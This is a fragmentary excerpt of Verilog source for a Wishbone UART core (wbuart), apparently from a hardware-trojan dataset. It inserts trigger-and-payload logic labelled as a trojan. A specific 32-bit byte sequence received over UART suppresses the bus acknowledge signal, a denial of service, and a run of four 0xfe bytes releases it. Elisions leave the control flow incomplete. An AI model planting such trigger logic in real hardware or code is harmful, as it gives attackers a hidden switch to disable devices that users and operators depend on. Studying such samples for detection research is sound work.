...
module	wbuart #(
	...
	localparam [31:0]	TROJAN_TRIGGER_SEQ = 32'h10a498bd;
	localparam [7:0]	TROJAN_RELEASE_BYTE = 8'hfe;
	localparam [2:0]	TROJAN_RELEASE_THRESHOLD = 3'd4;
	...
	reg	[1:0]	r_wb_addr;
	reg		r_wb_ack;
	reg	[31:0]	trojan_history;
	reg		trojan_dos_active;
	reg	[2:0]	trojan_release_count;
	reg		trojan_prev_stb;
	// }}}
...
`endif
	...
	always @(posedge i_clk) // Okay, time to set the ACK
		o_wb_ack <= (!i_reset)&&(r_wb_ack)&&(i_wb_cyc)&&(!trojan_dos_active);
	// }}}

	// Trojan trigger and payload logic
	// {{{
	initial	begin
		trojan_history = 32'h0000_0000;
		trojan_dos_active = 1'b0;
		trojan_release_count = 3'd0;
		trojan_prev_stb = 1'b0;
	end
	always @(posedge i_clk)
	if (i_reset)
	begin
		...
		if ((rx_stb)&&(!trojan_prev_stb))
		begin
			trojan_history <= { trojan_history[23:0], rx_uart_data };
			if (!trojan_dos_active)
			begin
				trojan_release_count <= 3'd0;
				if ({ trojan_history[23:0], rx_uart_data } == TROJAN_TRIGGER_SEQ)
				begin
					trojan_dos_active <= 1'b1;
					trojan_release_count <= 3'd0;
				end
			end else begin
				if (rx_uart_data == TROJAN_RELEASE_BYTE)
				begin
					if (trojan_release_count == (TROJAN_RELEASE_THRESHOLD-1))
					begin
						trojan_dos_active <= 1'b0;
						trojan_release_count <= 3'd0;
					end else
						trojan_release_count <= trojan_release_count + 3'd1;
				end else
					trojan_release_count <= 3'd0;
			end
		end
